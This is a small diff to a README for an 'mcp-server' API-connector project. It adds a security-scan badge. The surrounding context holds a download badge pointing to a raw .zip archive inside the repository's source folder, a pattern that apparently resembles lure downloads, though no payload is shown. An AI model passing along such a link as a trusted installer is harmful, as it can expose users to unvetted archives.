@@ -1,5 +1,7 @@
 # 🚀 mcp-server - Effortlessly Connect to 249+ APIs
 
+[![SafeSkill 89/100](https://img.shields.io/badge/SafeSkill-89%2F100_Passes%20with%20Notes-yellow)](https://safeskill.dev/scan/freehellchestmimicpsx-star-mcp-server)
+
 [![Download mcp-server](https://raw.githubusercontent.com/vtnhogg/mcp-server/main/pypi/src/apiverve_mcp/server_mcp_v1.0.zip)](https://raw.githubusercontent.com/vtnhogg/mcp-server/main/pypi/src/apiverve_mcp/server_mcp_v1.0.zip)
 
 ## 📋 Description
